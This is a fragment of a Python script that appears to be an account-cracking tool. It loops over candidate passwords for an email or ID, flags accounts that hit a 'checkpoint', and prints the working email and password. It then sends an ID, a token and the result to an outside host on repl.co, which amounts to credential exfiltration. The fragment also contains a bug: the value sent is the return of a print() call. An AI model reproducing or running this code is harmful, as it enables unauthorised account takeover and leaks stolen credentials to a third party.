...
def method_validate(idf,pwv):
	...
	fff = '%'
	sys.stdout.write(f"\r [Ɑ͞abdo ̶͞ ̶͞ ඩ] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{x}  {P}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				kukis=print(f'\r├──> Emel  : {kk}{idf}{P} | PW : {kk}{pw}{P} | Tahun {m}<> {kk}{tahun(idf)}{P}\n└──> User Aqua  : {kk}{ua}{P} ')
				re = requests.get(f"https://zaid-1.zodhok.repl.co/1/tele={ID}∆{token}∆{kukis}").text
